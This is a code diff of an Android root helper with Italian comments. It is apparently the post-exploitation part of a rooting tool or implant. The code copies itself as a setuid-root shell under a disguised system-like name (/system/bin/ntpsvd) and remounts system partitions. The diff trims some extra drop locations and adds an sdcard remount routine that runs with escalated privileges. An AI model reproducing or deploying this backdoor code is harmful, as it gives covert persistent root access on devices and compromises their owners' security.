@@ -31,6 +31,7 @@ unsigned int getProcessId(const char *p_processname);
 int setgod();
 void sync_reboot();
 int remount(const char *mntpoint, int flags);
+int my_mount(const char *mntpoint);
 static void copy_root(const char *mntpnt, const char *dst);
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
@@ -70,12 +71,8 @@ int main(int argc, char** argv) {
 			remount("/system", 0);
 		} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
 			copy_root("/system", "/system/bin/ntpsvd");
-			copy_root("/", "/ntpsvd");
-			copy_root("/system", "/system/xbin/ntpsvd");
-			copy_root("/system", "/system/customize/ntpsvd");
-			copy_root("/system", "/system/app/ntpsvd");
-			copy_root("/system", "/system/etc/ntpsvd");
-			copy_root("/system", "/system/tts/ntpsvd");
+		} else if (strcmp(argv[1], "sd") == 0) {
+			my_mount("/mnt/sdcard");
 		}
 	} else {
 		const char * shell = "/system/bin/sh";
@@ -99,11 +96,15 @@ int main(int argc, char** argv) {
 }
 
 static void copy_root(const char *mntpnt, const char *dst) {
-	remount(mntpnt, 0);
+	if (mntpnt != NULL)
+		remount(mntpnt, 0);
+
 	copy("/proc/self/exe", dst);
 	chown(dst, 0, 0);
 	chmod(dst, 04755);
-	remount(mntpnt, MS_RDONLY);
+
+	if (mntpnt != NULL)
+		remount(mntpnt, MS_RDONLY);
 }
 
 static int copy(const char *from, const char *to) {
@@ -250,6 +251,52 @@ int remount(const char *mntpoint, int flags) {
     }
 
     return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
+}
+
+int my_mount(const char *mntpoint) {
+    FILE *f = NULL;
+    int found = 0;
+    char buf[1024], *dev = NULL, *fstype = NULL;
+
+    if (!setgod()) {
+        return -1;
+    }
+
+    if ((f = fopen("/proc/mounts", "r")) == NULL) {
+        return -1;
+    }
+
+    memset(buf, 0, sizeof(buf));
+
+    for (;!feof(f);) {
+        if (fgets(buf, sizeof(buf), f) == NULL)
+            break;
+
+        if (strstr(buf, mntpoint)) {
+            found = 1;
+            break;
+        }
+    }
+
+    fclose(f);
+
+    if (!found) {
+        return -1;
+    }
+
+    if ((dev = strtok(buf, " \t")) == NULL) {
+        return -1;
+    }
+
+    if (strtok(NULL, " \t") == NULL) {
+        return -1;
+    }
+
+    if ((fstype = strtok(NULL, " \t")) == NULL) {
+        return -1;
+    }
+
+    return mount(dev, mntpoint, fstype, 0, 0);
 }
 
 int setgod() {
